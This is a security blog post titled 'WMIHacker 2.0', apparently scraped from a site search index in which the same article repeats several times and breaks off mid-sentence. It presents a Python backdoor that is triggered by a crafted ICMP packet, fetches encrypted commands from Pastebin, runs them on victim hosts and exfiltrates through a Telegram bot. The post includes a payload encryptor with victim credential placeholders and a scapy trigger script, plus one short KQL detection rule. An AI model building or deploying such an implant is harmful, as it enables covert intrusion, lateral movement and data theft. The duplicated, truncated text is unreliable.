2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here:\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 